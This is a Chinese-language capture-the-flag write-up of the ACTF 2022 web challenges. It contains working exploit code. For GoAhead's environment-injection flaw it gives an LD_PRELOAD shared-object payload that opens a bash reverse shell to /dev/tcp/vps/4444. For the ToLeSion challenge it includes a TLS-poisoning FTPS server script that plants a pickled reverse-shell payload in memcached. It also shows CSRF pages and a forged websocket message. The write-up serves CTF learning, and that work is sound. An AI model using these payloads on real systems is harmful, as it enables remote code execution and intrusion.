ACTF-web-WP&amp;分析记录
====================

![image-20220630191904114](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-63df729e8e311683ea2f0d888507dda2cef45eb3.png)

​ 上周末的ACTF在web方向的题目质量还是很高的(至少对我这个caiji来说),同时出现了两个之前比赛不怎么常用的漏洞利用点,还是很值得学习的,一个是TLS的会话复用(HTTPS和FTPS均可,在这次比赛用的是FTPS),还有一个点那就是通过mysql的配置加载插件,然后插件提权进行RCE

gogogo
------

题目描述

```php
ACTF warmup
http://123.60.84.229:10218
docker retstart every 10 minutes!
```

看一下dockerfile:

![image-20220630181313802](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-bad44e43c45fc6ad5b7d37e3f56b4b3f52d69ddf.png)

可以看到从github项目下载了goahead服务,同时在cgi-bin接口/htllo

![image-20220630181500369](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-19125078f147f7ae11c435c94228c23f049830b6.png)

访问一下`/cgi-bin/hello`

![image-20220630181617858](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-56ecb49f09c246eb89430942514b217f8b0c0ca5.png)

可以看到返回了env命令的执行返回结果,到这里,题目的环境也就了解完了,漏洞点在哪里呢?

这个如果看过p神的文章:[GoAhead环境变量注入复现踩坑记](https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html)那对这个题就不会陌生了,可以看到题目的dockerfile和p神文章中的dockerfile可以说是如出一辙了

![image-20220630181901575](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-26ec3df49e4307f7fd80a46c80c463d5eea31bd1.png)

那么要怎么样利用漏洞解题,看过文章之后可以知道有以下漏洞点:

1. 该环境的goahead服务会将我们form表单传入的数据键值对设置为环境变量
2. `/proc/self/fd/xxx`这个指针指向我们上传的临时文件

这时候就要用到一个环境变量了:`LD_PRELOAD`

LD\_PRELOAD的作用和用法可以参考这两篇文章:[原理参考](https://zgao.top/%E5%88%A9%E7%94%A8ld_preload%E5%AE%9E%E7%8E%B0%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E4%BB%A5%E5%8F%8A%E7%94%A8%E6%B3%95%E6%80%BB%E7%BB%93/) ,[使用方法](https://cloud.tencent.com/developer/article/1683272)

最后我们传输一个form表单,设置`LD_PRELOAD=/proc/self/fd/6-20`(多线程)

```python
import os
import threading

payload="""
#include <stdlib.h>
#include <string.h>
__attribute__ ((constructor)) void call ()
{
    unsetenv("LD_PRELOAD");
    char str[65536];

    system("bash -c 'exec bash -i &>/dev/tcp/vps/4444 <&1'");

    system("cat /flag > /var/www/html/flag");
}
"""
f=open("payload.c","w")
f.write(payload)
f.close()
def cmdcommand(cmd,pid):
    while 1:
        print("-"*100,pid)
        os.system(cmd)

_pid=int(input("pid#"))
for i in range(10):
    pid=_pid+i
    cmd = "gcc -shared -fPIC ./payload.c -o payload.so;curl -v -F data=@payload.so -F 'LD_PRELOAD=/proc/self/fd/%d' http://123.60.84.229:10218/cgi-bin/hello" % pid
    threading.Thread(target=cmdcommand,args=(cmd,pid,)).start()
```

先nc监听我们自己的vps的4444端口,然后运行python脚本对上传的so文件进行加载之后就会反弹shell到我们的vps上

如果失败了就微调一下pid即可,拿到shell之后执行`cat /flag`获取flag

![image-20220630183904064](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f197890c1dc4e50fc3cfa4faaff758db91b043e9.png)

![image-20220630183725251](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-3c47f5d0fa167e04493c699a8c4a52cc72a5a838.png)

beWhatYouWannaBe
----------------

题目描述

```php
“doctor, actor, lawyer or a singer
why not president, be a dreamer
You can be just the one you wanna be.”

http://124.71.180.254:10022
It is recommended to test locally first.
Chrome’s processes will be cleaned up every 2 minutes to avoid take up too much memory.
Attachment is updated[2022-06-26 2:10 UTC+8] for stable exploitation.
```

题目可利用点只有一个:admin用户的CSRF

有两段flag:

1. 一段需要成为admin类型的用户后直接访问/flag获取
2. 需要CSRF让admin用户访问页面后从页面获取元素满足`fff.lll.aaa.ggg.value == "this_is_what_i_want"`然后就会带着flag再次访问传入的url

![image-20220630184551625](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6e53e796eee686e987966db3e10bec8199f3dff9.png)

第一部分的flag获取检验的admin身份并不是必须为用户名为admin的用户,我们是可以通过`/beAdmin`接口让自己的账号变为一个"admin账户",但是想要成为admin用户需要满足当前的tocken验证(这个tocken是通过当前时间戳获取的),写一个help.heml:

```html

<html>
  <body>
    <form name=loginform action="http://127.0.0.1:8000/beAdmin" method="POST" target="_blank">
      <input type="hidden" name="username" value="admin" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="csrftoken" value="tocken" />
    <input type="submit" value="Submit request" />
    </form>
    <iframe name=ifname src="/" frameborder="0"></iframe>>
      <script >
for(var i=1;i<1000;i++){
        var flagtext;
        var myRequest = new Request('/getToken');//该接口我们自己实现
        fetch(myRequest).then(function(response) {
          return response.text().then(function(text) {
            document.loginform.username.value = 'admint';
            document.loginform.password.value = 'admint';
            document.loginform.csrftoken.value = text;
            console.log(document.loginform.username.value,document.loginform.password.value,document.loginform.csrftoken.value);
            document.loginform.submit();
          });
        });
}
      </script>
  </body>

</html>

```

生成tocken的关键代码如下:

```python
import hashlib
import math
import time

def encode():
    s = str(time.time_ns())[:-6:]
    f = int(s) / 1000
    sin = math.sin(f)
    text=sin
    sha = hashlib.sha256()  # Get the hash algorithm.
    sha.update(str(text).encode())  # Hash the data.
    b = sha.hexdigest()  # Get he hash value.
    print(s,f,sin,b)
    return b
```

之后多次尝试直到自己的账号变为admin账户后去访问、flag可以获得第一段flag

看一下第二部分flag获取的代码逻辑:

![image-20220630185100950](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7e0d407fac307cec90be0faeb140b2701578eded.png)

之后通过定义标签属性`name=fff`从而使得nodejs后台获得的fff为该标签对象

至于去标签的lll.aaa.ggg的过程有两种解决方法:

1. 方法一是通过逐个页面定义获取属性值最后得到`this_is_what_i_want`
    
    
    1. 1.html定义一个`name=fff`的iframe标签,直接添加src为含有`name=lll`子标签的的下一个html页面2.html
        
        ```html
        <html>
          <!-- 1.html -->
          <iframe name=fff src="2.html">
        </html>
        ```
    2. 2.html页面中定义一个标签`name=lll`的标签,指向含有`name=ggg`的3.html
        
        ```html
        <html>
          <!-- 2.html -->
          <iframe name=lll src="3.html">
        </html>
        ```
    3. 3.html中可以获取到aaa.ggg,它的值就是`this_is_what_i_want`
        
        ```html
        <html>
           <!-- 3.html -->
           <form id=aaa>
              <input name="ggg" type="submit" value="this_is_what_i_want"/>
          </form>
        </html>
        ```
    4. 最后将这三个html放到vps下,让admin进行访问http://vps:port/1.html即可
    5. 查看http://vps:port的访问记录即可获得admin携带flag访问的请求
2. 此外还可以直接将全部iframe写到iframe属性`srcdoc`中

ToLeSion
--------

题目描述

```php
“亲爱的actfer：
见字如晤！我在火热的杭州，希望你们可以快点AK web题，然后与我们相遇。
因为我们真的很羡慕你的才华，你是我探索ctf世界的动力，是我肾上腺素飙升的催化剂！
让我帮你看看那天空中挥舞着的旗帜，然后下来告诉你上面的风景有多美，上面的空气有多清新
，上面的风有多温柔！期待与你们的相遇！爱你们的lesion～”
http://123.60.131.135:10023
```

这题涉及到了TLS的会话复用,首先可以去看这篇文章了解一下FTPS如何通过隐式连接完成会话复用: [TLS-Poison 攻击方式在 CTF 中的利用实践](http://blog.zeddyu.info/2021/05/19/tls-ctf/)

源码如下:

```python
from flask import Flask, request, redirect
from flask_session import Session
from io import BytesIO
import memcache
import pycurl
import random
import string

app = Flask(__name__)
app.debug = True
app.secret_key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(56))

app.config['SESSION_TYPE'] = 'memcached'
app.config['SESSION_PERMANENT'] = True# 如果设置为True，则关闭浏览器session就失效。
app.config['SESSION_USE_SIGNER'] = False# 是否对发送到浏览器上session的cookie值进行加密
app.config['SESSION_KEY_PREFIX'] = 'actfSession:'# 保存到session中的值的前缀
app.config['SESSION_MEMCACHED'] = memcache.Client(['127.0.0.1:11200'])# 用于连接memcached的配置

Session(app)

@app.route('/')
def index():
    buffer=BytesIO()
    if request.args.get('url'):
        url = request.args.get('url')
        c = pycurl.Curl()
        c.setopt(c.URL, url)
        c.setopt(c.FTP_SKIP_PASV_IP, 0)
        c.setopt(c.WRITEDATA, buffer)
        blacklist = [c.PROTO_DICT, c.PROTO_FILE, c.PROTO_FTP, c.PROTO_GOPHER, c.PROTO_HTTPS, c.PROTO_IMAP, c.PROTO_IMAPS, c.PROTO_LDAP, c.PROTO_LDAPS, c.PROTO_POP3, c.PROTO_POP3S, c.PROTO_RTMP, c.PROTO_RTSP, c.PROTO_SCP, c.PROTO_SFTP, c.PROTO_SMB, c.PROTO_SMBS, c.PROTO_SMTP, c.PROTO_SMTPS, c.PROTO_TELNET, c.PROTO_TFTP]
        allowProtos = c.PROTO_ALL
        for proto in blacklist:
            allowProtos = allowProtos&~(proto)
        c.setopt(c.PROTOCOLS, allowProtos)
        c.perform()
        c.close()
        return buffer.getvalue().decode('utf-8')
    else:
        return redirect('?url=http://www.baidu.com',code=301)

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False)
```

可以看到session是通过一个mencached服务存储的(python对mencached中存入和取出的数据会进行序列化和反序列化):

![image-20220630193357278](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-31f52c9140ca3624cb8b204b5c3d052344e26980.png)

只有一个curl的请求功能,而且能用的只剩下HTTP和FTPS这两个协议,最后将buffer中的数据取出后进行UTF-8解码后返回

![image-20220630193417189](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-37b665c5efd22a04ab2045307442258b2a40374d.png)

涉及知识点:

1. TLS的会话复用
2. python在mencached中存储信息的方式
3. 域名解析证书的使用
4. FTPS数据传输功能的实现

先简单看一下FTPS的连接过程:

![image-20220630185454121](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fd756d2ff0f337a4c0cb2127f7d415975cd9881c.png)

左侧为FTPS的隐式连接方式,右侧为FTPS的显示连接方式,我们默认下使用的是隐式连接

这里TLS会话复用主要就出现在[PASV](http://blog.zeddyu.info/2021/05/19/tls-ctf/#pasv)命令工作的时候:

1. FTPS会话连接建立
2. 让客户端进行登录
3. 告诉客户端登陆成功
4. 开始执行命令交互(从这里开始重要了)
5. 客户端发出命令想要从FTPS服务端获取资源
6. server返回传输资源的ip和端口(我们将这个ip:port指定为mencached的服务地址和端口,PASV的作用就在这时候体现)
7. client和sever指定的ip:port进行连接(向mencached发送数据包)
8. client进行接收资源数据的准备工作,完成后告知sever已经完成准备
9. server收到准备完成的消息后告知client连接建立完成,开始传输数据
10. 进行数据传输
11. 数据传输结束,关闭连接

主要坑点:

1. 需要注意使用正确的DNS证书
2. 需要修改FTPS实现过程中的返回数据
3. 需要自己计算一下11200=256\*43+192(这是FTPS进行会话复用时的连接端口)
4. mencached语句正确使用(set 键名 标识 数据长度 存储时间)回车()

解题主要用到的就是`ZeddYu`师傅在上文连接中提到的[EXP工具](https://github.com/ZeddYu/TLS-poison),简单说一下这个工具的作用:

1. 指定证书进行TLS连接并将将TLS上层流量转发到 2048 端口,然后我们在2048端口实现一个FTPS的服务流程(就是指定发出一些FTPS连接过程中命令执行的返回数据)
2. 从redis服务中从`payload`键值对的值作为FTPS会话复用的时候需要执行的memcached命令

该脚本主要从[Practice1-hxp2020/solution2/exp.py](https://github.com/ZeddYu/TLS-poison/blob/master/Practice1-hxp2020/solution2/exp.py)修改得到

```python
#i
import os
import pickle
import socketserver
import sys

import redis
class Test2(object):
    def __reduce__(self):
        #被调用函数的参数
        cmd = f"bash -c 'exec bash -i &>/dev/tcp/{sys.argv[2]}/{sys.argv[3]} <&1'"
        return (os.system,(cmd,))
pickle_code=pickle.dumps(Test2())
print(pickle_code)
length=len(pickle_code)
payload=b"\r\nset actfSession:admint 0 0 "+str(len(pickle_code)).encode()+b"\r\n"+pickle_code+b"\r\n"
def set_payload(payload):
    r = redis.Redis(host='127.0.0.1', port=6379, db=0)
    print('payload len: ', len(payload), file=sys.stderr)
    r.set('payload', payload)
    return payload

print("设置的sessionid为:",set_payload(payload))
print("payload长度为:",len(payload))

class MyTCPHandler(socketserver.StreamRequestHandler):
    def handle(self):
        print(0,'[+] connected', self.request, file=sys.stderr)
        self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(1,self.data, file=sys.stderr,flush=True)
        self.request.sendall(b'230 Login successful.\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(2,self.data, file=sys.stderr)
        self.request.sendall(b'227 yolo\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(3,self.data, file=sys.stderr)
        self.request.sendall(b'227 yolo\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(4,self.data, file=sys.stderr)
        self.request.sendall(b'257 "/" is the current directory\r\n')
# vps:importlib/a/b
#         self.data = self.rfile.readline().strip().decode()
#         print(5,self.data, file=sys.stderr)
#         self.request.sendall(b'250 Directory successfully changed.\r\n')
#
#         self.data = self.rfile.readline().strip().decode()
#         print(6,self.data, file=sys.stderr)
#         self.request.sendall(b'250 Directory successfully changed.\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(7,self.data, file=sys.stderr)
        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n')

        self.data = self.rfile.readline().strip().decode()
        print(8,self.data, file=sys.stderr)
        # (47,99,70,18,43,203) 47.99.70.18：11211        # (127,0,0,1,43,0) 11008

        self.request.sendall(b'227 Entering Passive Mode (127,0,0,1,43,192)\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(9,self.data, file=sys.stderr)
        self.request.sendall(b'200 Switching to Binary mode.\r\n')
        # self.data = self.rfile.readline().strip().decode()
        # # assert 'SIZE refs' == self.data, self.data
        # self.finish()
        # print(10,self.data, file=sys.stderr)
        self.request.sendall(b'213 7\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'125 Data connection already open. Transfer starting.\r\n')
        self.data = self.rfile.readline().strip().decode()
        print(self.data, file=sys.stderr)
        self.request.sendall(b'250 Requested file action okay, completed.')
        print("DIE.....")
        # exit()

print("使用端口:",sys.argv[1])

with socketserver.TCPServer(('0.0.0.0', int(sys.argv[1])), MyTCPHandler) as server:
    while True:
        print("start...")
        server.handle_request()
        open("stop", "w").write("OK")
        print("END....")
        # exit()

```

获取域名证书(我这里是腾讯云的SSL证书):

![image-20220629193723351](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6e7dc312e7896f4b227f147851a2cbd076025380.png)

![image-20220629193742827](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-13e42bd5aadd36c9aa5cde60e6c6c14b0083e1b3.png)

![image-20220629193801411](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-adcbc4cfeac578696bec2b85596845f119ab0d16.png)

![image-20220629194037111](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-69c320a4a2b2091e7b2c226013fb4f2c9f88b7bf.png)

然后将图中的key和bundle.pem分别写入文件key.pem和cert.pem

**执行命令:**

> 使用上层流量转发工具
> 
> ```bash
> wget https://github.com/ZeddYu/TLS-poison/archive/refs/heads/master.zip
> unzip TLS-poison-master.zip
> TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11212 --certs cert.pem --key key.pem --verbose forward 2048
> ```
> 
> 开启处理FTPS服务
> 
> ```bash
> python3 tls.py 2048 vps 4444
> ```
> 
> nc监听等待反弹shell:
> 
> ```bash
> nc -vlp 4444
> ```

开启上面服务之后访问/?url=ftps://DNSname:11212/a

![image-20220629200149605](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-107af85694a405eb06d3f90f18667d6641a86381.png)

然后我们可以在python服务中看到消息发送情况(注意,我们需要完成整个):

![image-20220629230905117](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6881ef0e66b3c7468742d58ebd33126ddc6e5b72.png)

到此我们反弹shell的pythonc序列化数据已经存入了mencached中了,只要我们使用对应的sessionid那么python就会取出mencache中存储的数据进行反序列化

将cookie中的sessionid修改为我们设置的以`actfSession:`开头的id:`actfSession:admint`,然后对页面进行刷新,此时可以看到成功反弹shell到我们的服务器

![image-20220629201125771](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-0dc1b8cc36b4d8241014773738d796c67333d798.png)

执行/readflag获取flag

![image-20220629201208886](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-e3168d171eb626af2c026f632b95c8c2b951011e.png)

ACTF{GO0d\_jo6\_y0u\_Ar3\_G0od\_At\_Tl3\_p0i30n}

myclient
--------

题目描述

```php
A cute mysql here, try to exploit it!
http://124.71.205.170:10047

The /tmp of the remote environment is fixed and does not require sql injection
The directory is cleaned every five minutes
It is recommended to test locally first

远程的环境的/tmp是固定的，不需要sql注入
/tmp目录每五分钟清理一次
建议先测试本地
```

源码不多,就是通过`mysqli_options`设置mysqli的连接配置(注意,设置的是mysqli连接的客户端的而不是mysql服务端的配置)

```php
<?php
    $con = mysqli_init();
    $key = $_GET['key'];
    $value = $_GET['value'];
    if(strlen($value) > 1500){
        die('too long');
    }
    if (is_numeric($key) && is_string($value)) {
        mysqli_options($con, $key, $value);
    }

mysqli_options($con,MYSQLI_READ_DEFAULT_FILE, "./1.cnf");
//    MYSQLI_READ_DEFAULT_GROUP 5        MYSQLI_INIT_COMMAND   3

    mysqli_options($con, MYSQLI_OPT_LOCAL_INFILE, 0);
    if (!mysqli_real_connect($con, "127.0.0.1", "root", "123456", "mysql")) {
        $content = 'connect failed';
    } else {
        $content = 'connect success';
    }
echo $content;
    $end=$con->query("SHOW GLOBAL VARIABLES like '%character%'");
    var_dump($end->fetch_array());
    mysqli_close($con);

?>
```

![image-20220629204851547](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-08f47fb5965ccb480eb9e27233de3cfedba0a475.png)

首先我们看dockefile和start.sh以及index.php可知我们使用的用户是test用户而不是root用户,并且我们只有`select`和`FILE`权限(也就是可以查询数据和将数据写入/tmpe1...3e下的任意文件下)

看一下`mysqli::options`函数:

![image-20220629204325527](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-7a89d401aeb5dda4b4bc2abacde0ee3967777c6f.png)

第二个参数我们能配置的选项和功能有:

![image-20220629204413139](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-6c5de9bb4882601b6c1b1781161587c1677ef9f6.png)

对我们解题可以关注以下配置:

```php
MYSQLI_OPT_LOCAL_INFILE 启用或禁用 LOAD LOCAL INFILE 语句
MYSQLI_INIT_COMMAND 从指定的文件中读取选项，而不是使用 my.cnf 中的选项
MYSQLI_READ_DEFAULT_FILE    从指定的文件中读取选项，而不是使用 my.cnf 中的选项
MYSQLI_READ_DEFAULT_GROUP   从 my.cnf 或者 MYSQL_READ_DEFAULT_FILE 指定的文件中 读取指定的组中的选项。
```

在这里我们主要用到了以下两个配置:

```php
MYSQLI_INIT_COMMAND 进行数据查询和文件组合
MYSQLI_READ_DEFAULT_FILE 指定配置文件和导入配置选项
```

插件代码的构造可参考这篇文章: [传送门:MySQL 插件详解](https://gohalo.me/post/mysql-plugin.html)

poorui
------

题目描述

```php
Chatting with each other!
Attachment is update’d at 2022-06-26 11:34 (UTC+8)
http://124.71.181.238:8081/
```

以下应该为非预期解,预期解应该是先通过代码审计发现后台在编译模板的时候用了旧版本的lodash,从而导致原型链产生,然后我们通过修改属性is="abc"和onanimationstart="JS\_code"进行xss,修改发送出去的msg中的api获取flag,但是我们这里只说一下非预期的解法

可以直接使用ws协议传输api为getflag的payload获取flag(可以写一个js使用`WebSocket`对象连接ws也可以像下面一样直接抓包):

先使用admin用户名登录

![image-20220629195046224](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a2822d315216bf0e01a6df2e5c9a131c9766f103.png)

然后对自己(admin)随意发送一些数据:

![image-20220629195123171](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f5d6c65058e0143491ee215c81a86ff0b866b5c0.png)

这时在发送信息之前先打开抓包,可以看到进行了websocket的同通信,并且api为sendmsg,我们可以直接修改api

![image-20220629194822105](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-c006638bd98a01296c61e8babafa82aca8e6b238.png)

将sendmsg改为getflag

```php
{"api":"sendmsg","to":"admin","msg":{"type":"text","data":"a"}}
{"api":"getflag","to":"admin","msg":{"type":"text","data":"a"}}
```

放开请求后可以直接获得flag(前提是要以admin登录)

![image-20220630160444550](https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f9fcd2b25197277009754ec0ab35693911c651a4.png)